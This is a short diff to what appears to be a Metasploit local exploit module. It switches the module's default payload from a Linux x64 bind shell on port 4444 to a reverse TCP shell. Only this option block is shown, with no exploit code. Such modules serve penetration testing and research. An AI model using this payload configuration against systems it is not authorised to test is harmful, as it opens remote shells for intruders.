@@ -61,8 +61,7 @@ class MetasploitModule < Msf::Exploit::Local
         'DisclosureDate' => '2026-05-07',
         'DefaultOptions' => {
           'WfsDelay' => 300,
-          'PAYLOAD'  => 'linux/x64/shell_bind_tcp',
-          'LPORT'    => 4444
+          'PAYLOAD'  => 'linux/x64/shell_reverse_tcp',
         },
         'Notes'          => {
           'Stability'    => [CRASH_SAFE],
